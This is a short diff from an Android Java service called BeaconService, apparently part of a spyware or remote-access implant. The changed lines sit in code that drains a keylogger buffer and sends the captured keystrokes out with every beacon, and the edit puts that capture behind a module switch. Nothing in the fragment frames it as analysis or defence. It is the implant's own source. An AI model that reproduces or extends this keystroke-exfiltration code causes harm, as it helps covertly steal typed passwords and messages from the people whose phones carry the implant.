@@ -281,7 +281,7 @@ public class BeaconService extends Service {
             }
             // Keylogger buffer ships with every beacon so capture is live, not
             // operator-triggered; keylog_dump still drains whatever is left.
-            if (KeyMon.connected()) {
+            if (KeyMon.connected() && Modules.on(this, "keylog")) {
                 JSONArray keys = KeyMon.drain(150);
                 if (keys.length() > 0) {
                     Outbox.event("keylog", keys);
